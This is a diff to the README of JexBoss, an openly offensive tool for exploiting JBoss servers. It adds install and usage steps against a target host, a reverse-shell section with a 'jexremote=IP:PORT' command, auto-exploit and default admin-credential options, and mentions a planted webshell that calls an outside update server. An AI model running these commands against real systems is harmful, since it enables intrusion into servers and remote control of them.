@@ -9,14 +9,15 @@ Requirements
 * [urllib3](https://pypi.python.org/pypi/urllib3)
 * [ipaddress](https://pypi.python.org/pypi/ipaddress)
 
-Installation
-----
+Installation on Linux\Mac
+-------------------------
 To install the latest version of JexBoss, please use the following commands:
 
 	git clone https://github.com/joaomatosf/jexboss.git
 	cd jexboss
 	pip install -r requires.txt
 	python jexboss.py -h
+	python jexboss.py -host http://target_host:8080
 
 	OR:
 
@@ -25,6 +26,7 @@ To install the latest version of JexBoss, please use the following commands:
 	cd jexboss-master
 	pip install -r requires.txt
 	python jexboss.py -h
+	python jexboss.py -host http://target_host:8080
 
 
 If you are using CentOS with Python 2.6, please install Python2.7.
@@ -34,6 +36,24 @@ Installation example of the Python 2.7 on CentOS using Collections Software scl:
     yum -y install python27
     scl enable python27 bash
 
+Installation on Windows
+-----------------------
+If you are using Windows, you can use the [Git Bash](https://github.com/git-for-windows/git/releases/tag/v2.10.1.windows.1) to run the JexBoss. Follow the steps below:
+
+* Download and install [Python](https://www.python.org/downloads/release/python-2712/)
+* Download and install [Git for Windows](https://github.com/git-for-windows/git/releases/tag/v2.10.1.windows.1)
+* After installing, run the Git for Windows and type the following commands:
+
+```
+    PATH=$PATH:C:\Python27\
+    PATH=$PATH:C:\Python27\Scripts
+    git clone https://github.com/joaomatosf/jexboss.git
+    cd jexboss
+    pip install -r requires.txt
+    python jexboss.py -h
+    python jexboss.py -host http://target_host:8080
+    
+```
 
 Features
 ----
@@ -49,6 +69,19 @@ The exploitation vectors are:
 	- tested and working in JBoss versions 4
 * /invoker/JMXInvokerServlet
 	- tested and working in JBoss versions 4 and 5
+
+Reverse Shell (meterpreter integration)
+---------------------------------------
+After exploit a server, you can use the own jexboss shell of commands or perform a reverse connection using the following command:
+```
+   jexremote=YOUR_IP:YOUR_PORT
+
+   Example:
+     Shell>jexremote=192.168.0.10:4444
+```
+
+* Example:
+![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/jexbossreverse.png)
 
 Screenshots
 ----
@@ -107,14 +140,25 @@ optional arguments:
   --auto-exploit, -A    Send exploit code automatically (USE ONLY IF YOU HAVE
                         PERMISSION!!!)
   --disable-check-updates, -D
-                        Disable the check for updates performed by JSP
-                        Webshell at:
-                        http://webshell.jexboss.net/jsp_version.txt
-  -mode {auto-scan,file-scan,standalone}
+                        Disable two updates checks: 1) Check for updates
+                        performed by the webshell in exploited server at
+                        http://webshell.jexboss.net/jsp_version.txt and 2)
+                        check for updates performed by the jexboss client at
+                        http://joaomatosf.com/rnp/releases.txt
+  -mode {standalone,auto-scan,file-scan}
                         Operation mode
+  --proxy PROXY, -P PROXY
+                        Use a http proxy to connect to the target URL (eg. -P
+                        http://192.168.0.1:3128)
+  --proxy-cred LOGIN:PASS, -L LOGIN:PASS
+                        Proxy authentication credentials (eg -L name:password)
+  --jboss-login LOGIN:PASS, -J LOGIN:PASS
+                        JBoss login and password for exploit admin-console in
+                        JBoss 5 and JBoss 6 (default: admin:admin)
+  --timeout TIMEOUT     Seconds to wait before timeout connection (default 3)
 
 Standalone mode:
-  -host HOST            Host address to be checked (eg.
+  -host HOST, -u HOST   Host address to be checked (eg. -u
                         http://192.168.0.10:8080)
 
 Auto scan mode:
@@ -134,7 +178,7 @@ File scan mode:
 * Standalone mode:
 
 ```
-* Via git:
+* Installation via git:
 
 $ git clone https://github.com/joaomatosf/jexboss.git
 $ cd jexboss
